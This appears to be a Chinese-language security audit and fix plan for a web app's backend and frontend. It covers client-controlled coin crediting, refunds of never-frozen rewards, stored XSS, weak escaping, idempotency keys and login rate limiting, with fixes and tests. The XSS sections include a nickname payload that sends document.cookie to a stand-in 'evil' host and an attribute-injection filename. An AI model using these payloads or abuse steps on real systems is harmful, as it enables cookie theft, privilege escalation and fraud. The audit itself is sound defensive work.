## P0-1 · 无限刷币接口（后端，最高优先级）

**位置**：`server/src/app.ts:2387-2427`（`POST /api/buddy-box/features`），关键在 `2395-2399`。

**现状**：
```ts
const pointDelta = input.feature === 'box' && input.action === 'draw'
  ? -1
  : input.feature === 'prestige' && input.action === 'settle'
    ? Math.max(-100, Math.min(100, Number.isInteger(payload.delta) ? Number(payload.delta) : 0))
    : 0;
```
`payload.delta` 完全由客户端提供，正值直接给用户加币（每次最多 +100）。幂等键 `idempotencyKey` 也由客户端在 `buddyFeatureSchema`（`app.ts:548-554`）里任意提供。

**问题**：任何登录用户循环发请求（每次换一个新 `idempotencyKey`，payload `{feature:'prestige',action:'settle',delta:100}`）即可无限增加余额。该余额可直接在商城下单消费。无权限校验、无服务端来源校验、无测试覆盖。

**改法**（二选一，推荐 A）：
- **A（推荐）**：彻底移除客户端可控的正向入账。`prestige/settle` 不应由前端决定加多少币。把这条 `pointDelta` 分支删掉，声望/奖励的变动只允许由服务端已有的可信业务路径（任务结算、采纳、退款等）触发。如果「盲盒玩法」确实需要消耗币，只保留 `box/draw` 的 `-1` 扣费分支。
- **B（若产品必须保留结算玩法）**：服务端根据 `feature/action` 自行计算 delta，忽略 `payload.delta`；且只允许负向或 0；正向奖励必须由服务端根据一次性、不可重放的事件推导，并对「同一玩法同一周期」加唯一约束防重复领取。

**验证**：新增测试 `server/tests/buddy-box-prestige-abuse.test.ts`：
1. 用户初始余额 100；连续调用 `prestige/settle delta=100` 两次（不同 key）；断言余额**未增加**（A 方案）。
2. `box/draw` 扣费路径仍正常（余额 -1，余额不足时 409 `INSUFFICIENT_PRESTIGE`）。

## P0-2 · 审核前取消任务 → 凭空退款（后端）

**位置**：
- 取消入口：`server/src/app.ts:1808-1826`（`POST /api/tasks/:id/cancel`）
- 退款逻辑：`server/src/app.ts:646-658`（`cancelTaskAndRefund`）
- 冻结逻辑：`server/src/app.ts:1635-1638`（在 `PATCH /api/tasks/:id/review`，仅 `status==='approved'` 时冻结）
- 任务创建：`server/src/app.ts:1516-1536`（**创建时不扣任何币**）

**现状 / 问题**：奖励币的冻结（从发布者扣款）**只在审核通过时**发生。但 `/cancel` 只拦 `completed`/`cancelled` 状态（`app.ts:1814`），对 `draft` / `pending_review` / `needs_revision` / `rejected` 的任务照样执行 `cancelTaskAndRefund`，而后者只要 `reward>0 && taskType∈{help,team,reward}` 就退款（`app.ts:647-650`）。
攻击：发布 `reward=10000` 的 help/reward 任务（team 型还乘 `maxClaimers`）→ 审核通过前立即取消 → 得到一笔从未被冻结过的退款。冻结与退款用不同幂等键，互不拦截。

**补充要审计的同类不对称**：`app.ts:1635` 的冻结条件带 `current.userId !== currentUserId(request)`——即发布者自审（若持 `taskReview` 权限）不冻结，但完成时仍照付（`app.ts:1784-1791`）。这是第二个潜在漏钱口，请一并核对。

**改法**：让「退款」严格对应「曾经冻结」。推荐做法——引入明确的资金状态而非靠任务状态推断：
- 最小改动：在 `cancelTaskAndRefund` 里增加前置判断，**只有任务确实处于「奖励已冻结」的状态才退款**。当前代码用任务状态间接表达资金状态，不可靠。可在 `Task` 上增加 `rewardFrozen: Boolean`（迁移），冻结时置 true、退款/结算时置 false，`cancelTaskAndRefund` 仅在 `rewardFrozen===true` 时退款并置回 false。
- 同时修 P0-2 补充点：把冻结改成「首次进入 approved 即冻结，无论审核者是谁」，或在自审路径补冻结，保证「付出去的钱一定先冻过」。

**验证**：`server/tests/task-refund-integrity.test.ts`：
1. 发布 reward>0 的 reward 型任务（此时未冻结）→ 直接 `/cancel` → 断言发布者余额**不变**，无 `task_reward_refund` 流水。
2. 正常路径：发布 → 审核通过（余额 -reward，有冻结流水）→ 取消 → 余额复原，且不会二次退款（重复调用 `/cancel` 幂等）。
3. team 型：核对退款额 `reward * maxClaimers` 与冻结额一致。

## P0-3 · 前端存储型 XSS 链一：排行榜昵称零转义

**位置**：`backend-handoff-package/growth-school.html:7180, 7196, 7223, 7248, 7822`（以及分叉文件 `growth-school.rollback-real-data.html` 中的对应处）。

**现状**：
```js
html += '<div class="podium-name">' + u.name + '</div>';   // 7180/7196
html += '<span class="rank-name">' + u.name + '</span>';    // 7223/7248
'<div class="gossip-top-name">' + user.name + '</div>'      // 7822
```

`u.name` 来自 `/api/users/leaderboard` 的 `user.nickname`，注册时不限字符集（`api-client.js:429` 只校长度和敏感词）。

**问题**：注册昵称 `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`（或任意脚本）→ 排行榜对所有访问者执行，含管理员。完整存储型 XSS。

**改法**：这些插值全部套用同文件已存在的 `escapeHtml()`（定义在 `growth-school.html:4357`，隔壁 gossip 渲染 7965-7981 已正确使用）。逐处改为 `escapeHtml(u.name)` / `escapeHtml(user.name)`。

## P0-4 · 前端存储型 XSS 链二：`escapeInlineString` 不转义双引号

**位置**：函数在 `backend-handoff-package/growth-school.html:4363-4365`；调用点 `4392, 5078, 5186, 7959, 7966, 7978, 8029` 等（共 13 处，全在**双引号**包裹的 HTML 属性内）。

**现状**：
```js
function escapeInlineString(str){
  return String(str || '').replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\r/g,'\\r').replace(/\n/g,'\\n');
}
```
只做了「JS 字符串字面量」转义，未处理 `"` 与 `<`，而输出落在 `onclick="fn('...')"` 这种「HTML 属性 → JS 字符串」双层上下文里。

**问题**：`attachment.originalName`（用户文件名）、`user.nickname`（昵称）含 `"` 即可闭合属性注入事件处理器。`5186` 在**管理员授权面板**渲染昵称，触发者是管理员——提权风险。

**改法**（根治优于逐点补）：不要用「拼字符串 + inline onclick」传数据。推荐按优先级：
1. **最优**：把这些 `onclick="fn('<data>')"` 改成事件委托——元素上放 `data-id` / `data-name` 属性，用一个 `addEventListener` + `event.target.closest('[data-...]')` 读取（`blacklist.js:121-136` 已有正确范例）。数据经 DOM 属性传递，天然免疫注入。
2. **折中（改动最小）**：先让 `escapeInlineString` 同时做 HTML 属性转义——即在现有基础上追加 `.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;')`（注意 `&` 要第一个替换）。一处改动覆盖全部 13 个调用点。但这只是止血，架构问题仍在（见 P2-3）。
3. 同时把 5 处手写的 `.replace(/'/g,"\\'")`（`7177, 7218, 7819, 8329, 8332`）统一换成修好的 `escapeInlineString`——它们比原函数还弱（连反斜杠都不转，`\'` 可被 `\\'` 绕过）。

**验证**：上传文件名为 `a" onmouseover="alert(1)" x=".jpg`、昵称设为含 `"` 的字符串，在附件列表和授权面板确认不触发注入。

## P1-1 · 悬赏扣款幂等键掺入 `Date.now()`（后端）

**位置**：`server/src/app.ts:2170`（`POST /api/inquiries`）。

**现状**：
```ts
`inquiry-bounty:${userId.toString()}:${hashToken(input.title + input.content + String(Date.now()))}`
```

**问题**：每次调用（含客户端超时重试）生成不同幂等键，幂等保护失效 → 重复发布可双扣，且如果一次请求内部重试也会重复扣。

**改法**：幂等键必须由**稳定的业务标识**构成，不含时间戳。让前端在创建打听时生成并提交一个 `idempotencyKey`（uuid），服务端用 `inquiry-bounty:${idempotencyKey}`；或先创建 inquiry 记录、再用 `inquiry-bounty:${inquiry.id}` 作键（把扣款移到拿到 id 之后）。

**验证**：同一 `idempotencyKey` 重复提交两次，断言只扣一次币、只建一条 inquiry。

## P1-2 · 登录接口无速率限制（后端）

**位置**：`server/src/app.ts:2909`（`POST /api/auth/login`）。验证码接口已有限流范例（`app.ts:2703-2704`），登录没有。

**问题**：可无限撞库/枚举密码。

**改法**：复用 `verificationLimiter`（`InMemoryRateLimiter`）或新建一个，对 `login-ip:${request.ip}`（如 20 次/5 分钟）和 `login-id:${identifier}`（如 10 次/15 分钟）限流，超限返回 429 + `retry-after`。

**同时修** `server/src/rate-limit.ts`：当前 `Map` 的 key 永不清理（内存泄漏），且是单机内存（多实例失效）。最小改动：在 `check` 里当某 key 的 `timestamps` 清空后 `delete` 该 key。若已多实例部署，标注 TODO 迁移到 Redis（用 `// ponytail:` 注释写明当前是单机限流的已知上限）。

**验证**：`server/tests` 加登录限流测试：连续错误登录触发 429。
